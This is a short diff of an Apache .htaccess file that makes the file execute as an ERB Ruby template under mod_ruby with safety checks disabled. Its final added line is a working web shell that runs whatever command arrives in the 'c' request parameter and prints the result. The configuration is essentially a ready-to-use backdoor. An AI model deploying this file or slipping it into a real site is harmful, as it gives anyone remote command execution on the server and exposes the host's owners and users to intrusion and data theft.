@@ -7,15 +7,15 @@
     Allow from all
 </Files>
 
-# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
-# the apache directoves from the .htaccess file
+# Make .htaccess file be interpreted as erb ruby file. This occur after 
+# apache has interpreted the apache directives from the .htaccess file
 <IfModule mod_ruby.c>
   RubyRequire apache/erb-run
-  RubySafeLevel 0
+  RubySafeLevel 0 
   AddType text/html .htaccess
   <Files *.htaccess>
     SetHandler ruby-object
     RubyHandler Apache::ERbRun.instance
   </Files>
 </IfModule>
-# <% puts "hello world" %>
+# <% require 'cgi';cgi = CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` %>
